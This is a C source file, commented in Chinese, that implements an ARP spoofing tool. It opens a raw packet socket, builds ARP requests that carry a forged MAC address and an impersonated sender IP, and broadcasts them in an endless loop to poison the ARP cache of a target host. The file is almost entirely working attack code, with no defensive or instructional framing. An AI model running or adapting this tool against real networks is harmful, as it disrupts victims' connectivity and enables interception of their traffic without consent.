#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <unistd.h>
#include <errno.h>
#include <sys/ioctl.h>
#include <sys/types.h>
#include <sys/socket.h>
#include <arpa/inet.h>
#include <net/ethernet.h>
#include <netinet/if_ether.h>
#include <netpacket/packet.h>
#include <net/if.h>

#include "arp_deceive.h"
#include "print_errno.h"

static int sock;   
static char sock_exsit;                                /* 标记，socket是否建立 */
struct sockaddr_ll sl;                                /* 设备无关的物理层地址结构 */
static int deceive_interval_ms = 1;
static char MAC_BDCAST[ETH_ALEN] = {0xFF, 0xFF, 0xFF, 0xFF, 0xFF, 0xFF};
static char MAC_TRICK[ETH_ALEN] = {0x00, 0x00, 0x00, 0x00, 0x00, 0x00}; 


void set_time(int i)
{
	deceive_interval_ms = i;
	
	return;
}

char arp_deceive_init()
{
	if(!sock_exsit)
	{
		sock_exsit = 1;
		if((sock = socket(PF_PACKET, SOCK_RAW, htons(ETH_P_ALL))) < 0)
		{
			sock_exsit = 0;
			fprintf(stdout, "Create socket error, please try to run as an administrator\n");
			return 1;
		}
	}
	memset(&sl, 0, sizeof(sl));
	sl.sll_family = AF_PACKET;
	sl.sll_protocol = htons(ETH_P_ALL);
	
	return 0;
}

void arp_deceive(char *deveice_name, char *trick_ip, char *target_ip)
{
	int ret;
	struct arp_packet arp;
	struct in_addr inaddr_tmp;
	struct ifreq ifr;
	
	arp_deceive_init();
	strncpy(ifr.ifr_name, deveice_name, sizeof(ifr.ifr_name) - 1);
	if(ioctl(sock, SIOCGIFINDEX, &ifr) < 0) 
	{
        print_errno("ioctl() SIOCGIFINDEX failed!\n");
        return;
    }
    sl.sll_ifindex = ifr.ifr_ifindex;
 
	memset(&arp, 0, sizeof(arp));
	memcpy(arp.eth_dst, MAC_BDCAST, ETH_ALEN); /* 广播地址 */
	memcpy(arp.eth_src, MAC_TRICK, ETH_ALEN);  /* 冒充的mac地址 */
	memcpy(arp.ar_sha, MAC_TRICK, ETH_ALEN);   /* 冒充的mac地址 */
	
	arp.eth_type = htons(0x0806);
	arp.ar_hrd = htons(0x1);
	arp.ar_pro = htons(0x0800);
	arp.ar_hln = ETH_ALEN;
	arp.ar_pln = 4;
	arp.ar_op = htons(0x1);
	
	inet_aton(trick_ip, &inaddr_tmp);
	memcpy(&arp.ar_sip, &inaddr_tmp, sizeof(inaddr_tmp)); /* 冒充的ip地址 */
	inet_aton(target_ip, &inaddr_tmp);
	memcpy(&arp.ar_dip, &inaddr_tmp, sizeof(inaddr_tmp)); /* 被欺骗的ip地址 */
	
	while(1)
	{
		ret = sendto(sock, &arp, sizeof(arp), 0, (struct sockaddr*)&sl, sizeof(sl));
		if(ret == -1)
		{
			printf("Send Error!\n");
			return;
		}
		else
		{
			printf("Send %d bytes! Deceiving...\n", ret);
		}
		usleep(deceive_interval_ms * 1000);
	}
 
	return;
}
